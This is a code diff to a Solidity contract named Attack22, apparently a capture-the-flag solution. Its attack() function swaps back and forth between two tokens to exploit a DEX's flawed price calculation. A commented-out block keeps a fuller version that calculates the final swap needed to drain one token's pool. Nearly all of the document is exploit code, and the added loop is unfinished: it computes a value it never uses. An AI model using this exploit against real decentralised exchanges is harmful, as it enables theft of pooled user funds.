@@ -16,32 +16,49 @@ contract Attack22 {
     function attack() public {
         address from = token1;
         address to = token2;
-        // 
-    }
 
+        for(uint i = 0; i < 5; i++) {
+            if (from == token1) {
+            from = token2;
+            }
+            else {
+                from = token1;
+            }
+            if (to == token1) {
+                to = token2;
+            }
+            else {
+                to = token1;
+            }
+        // the swap amount that the player wants to swap
+        uint256 amount = _target.balanceOf(from, address(this));
+        // how much you actually receive (which is more than amount)
+        uint256 amountReceived = _target.getSwapPrice(from, to, amount);
+
+        _target.swap(from, to, amount);
+        }   
+    }
     receive() external payable {}
 }
 
-// Remember:  we need to approve the tokens for swap
-// and THEN perform the swaps
 
 /*
     from = (from == token1) ? token2 : token1;
     to = (to == token1) ? token2 : token1;
 
     // how much we want to swap of token from (our entire balance, except for last iteration)
-    uint256 amount = dex.balanceOf(from, address(this));
+    uint256 amount = _target.balanceOf(from, address(this));
 
     // how much we will receive from the to token
-    uint256 amountReceived = dex.getSwapPrice(from, to, amount);
+    uint256 amountReceived = _target.getSwapPrice(from, to, amount);
     
     // for the last iteration, if we swap our entire balance of token from the swap will revert 
-    // since the dex doesn't have enough of token to we need to determine how much to send to 
+    // since the _target doesn't have enough of token to we need to determine how much to send to 
     // empty the other token balance
     
     if (amountReceived > 110) {
         amount = (amount * 110) / amountReceived; // swap amount to get the whole balance of the other token
     }
     
-    dex.swap(from, to, amount);
+    _target.swap(from, to, amount);
 */
